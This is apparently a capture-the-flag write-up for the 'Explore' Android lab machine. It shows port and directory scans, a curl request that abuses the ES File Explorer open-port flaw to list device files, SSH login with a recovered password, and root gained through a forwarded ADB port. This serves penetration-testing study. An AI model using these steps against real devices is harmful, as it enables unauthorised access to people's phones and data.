# Explore | Android

To start the challenge, first we do a port scanning using the network mapper(NMAP):

```jsx
┌─[bracketz@marians]─[~]
└──╼ $nmap -sV -p- 10.10.10.247 -T4
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-27 11:00 -03
Warning: 10.10.10.247 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.10.10.247
Host is up (0.59s latency).
Not shown: 65426 closed ports, 106 filtered ports
PORT      STATE SERVICE    VERSION
2222/tcp  open  ssh        (protocol 2.0)
44629/tcp open  tcpwrapped
59777/tcp open  http       Bukkit JSONAPI httpd for Minecraft game server 3.6.0 or older
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port2222-TCP:V=7.91%I=7%D=6/27%Time=60D895AB%P=x86_64-pc-linux-gnu%r(NU
SF:LL,24,"SSH-2\.0-SSH\x20Server\x20-\x20Banana\x20Studio\r\n");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 4426.56 seconds
```

On port 59777 has a Bukkit JSONAPI responsible to make a Minecraft PE server

![Explore%20Android/Untitled.png](Explore%20Android/Untitled.png)

The port 44057 has a ES File Explorer :

![Explore%20Android/Untitled%201.png](Explore%20Android/Untitled%201.png)

Searching a little bit, I found one vulnerability that allows us to get or execute commands via HTTP header or URL :

P**oc** - [https://github.com/fs0c131y/ESFileExplorerOpenPortVuln](https://github.com/fs0c131y/ESFileExplorerOpenPortVuln)

**Twitter post of vulnerability** - [https://twitter.com/fs0c131y/status/1085460755313508352](https://twitter.com/fs0c131y/status/1085460755313508352)

Running a directory scan in port to discover the system structure, we can see the android folders and in each folder, we can explore more and more to get the files using a tool and passing the PATH that you wish to discover.

```jsx
┌─[✗]─[bracketz@marians]─[~]
└──╼ $gobuster dir -u http://10.10.10.247:59777/ -w /usr/share/dirb/wordlists/common.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.247:59777/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/06/27 02:33:34 Starting gobuster in directory enumeration mode
===============================================================
/bin                  (Status: 301) [Size: 63] [--> /bin/]
/cache                (Status: 301) [Size: 67] [--> /cache/]
/config               (Status: 301) [Size: 69] [--> /config/]
/d                    (Status: 301) [Size: 59] [--> /d/]     
/data                 (Status: 301) [Size: 65] [--> /data/]  
/dev                  (Status: 301) [Size: 63] [--> /dev/]   
/etc                  (Status: 301) [Size: 63] [--> /etc/]   
/init                 (Status: 403) [Size: 31]               
/lib                  (Status: 301) [Size: 63] [--> /lib/]   
/oem                  (Status: 301) [Size: 63] [--> /oem/]   
/proc                 (Status: 301) [Size: 65] [--> /proc/]  
/product              (Status: 301) [Size: 71] [--> /product/]
/sbin                 (Status: 301) [Size: 65] [--> /sbin/]   
/storage              (Status: 301) [Size: 71] [--> /storage/]
/sys                  (Status: 301) [Size: 63] [--> /sys/]    
/system               (Status: 301) [Size: 69] [--> /system/] 
/vendor               (Status: 301) [Size: 69] [--> /vendor/] 
                                                              
===============================================================
2021/06/27 02:46:56 Finished
===============================================================
```

![Explore%20Android/Untitled%202.png](Explore%20Android/Untitled%202.png)

Testing a command:

![Explore%20Android/Untitled%203.png](Explore%20Android/Untitled%203.png)

Using the vulnerability we can remotely list all archives in directory:

```jsx
curl --header "Content-Type: application/json" --request POST --data '{"command":"listFiles"}' http://10.10.10.247:59777/
```

![Explore%20Android/Untitled%204.png](Explore%20Android/Untitled%204.png)

The GitHub POC has more commands to use.

![Explore%20Android/Untitled%205.png](Explore%20Android/Untitled%205.png)

Entering in sdcard folder retrieve us the user.txt flag:

![Explore%20Android/Untitled%206.png](Explore%20Android/Untitled%206.png)

 After discovering just copy the return paste it in your browser to visualize the flag file:

![Explore%20Android/Untitled%207.png](Explore%20Android/Untitled%207.png)

Changing the command listFiles with listPics shows the pictures directory, opening each picture I found one picture of a notebook written some password:

![Explore%20Android/Untitled%208.png](Explore%20Android/Untitled%208.png)

![Explore%20Android/Untitled%209.png](Explore%20Android/Untitled%209.png)

Rewriting password: Kr1sT!5h@Rp3xPl0r3!

We can try login in SSH using the user and password:

![Explore%20Android/Untitled%2010.png](Explore%20Android/Untitled%2010.png)

Interesting ports running on the system:

![Explore%20Android/Untitled%2011.png](Explore%20Android/Untitled%2011.png)

In the process has a ADB service running that is a Android Debugger.

![Explore%20Android/Untitled%2012.png](Explore%20Android/Untitled%2012.png)

```python
Active Internet connections (established and servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program Name
tcp6       0      0 ::ffff:10.10.10.2:43881 :::*                    LISTEN      -
tcp6       0      0 :::2222                 :::*                    LISTEN      3630/net.xnano.android.sshserver
tcp6       0      0 ::ffff:127.0.0.1:34511  :::*                    LISTEN      -
tcp6       0      0 :::5555                 :::*                    LISTEN      -
tcp6       0      0 :::42135                :::*                    LISTEN      -
tcp6       0      0 :::59777                :::*                    LISTEN      -
```

Making port-forwarding in SSH with port 5555 we can spawn android debugger and connect in [localhost](http://localhost) using the command ADB shell.

![Explore%20Android/Untitled%2013.png](Explore%20Android/Untitled%2013.png)

![Explore%20Android/Untitled%2014.png](Explore%20Android/Untitled%2014.png)

Probably the ADB shell is running as root, so we simply type SU and get the root session.

Now get the root flag in the data directory and OWN the “machine”🤣.

I do a simple script to interact with the vulnerability just for fun:

[https://github.com/sidhawkss/ES-File-Explorer-Vulnerability](https://github.com/sidhawkss/ES-File-Explorer-Vulnerability)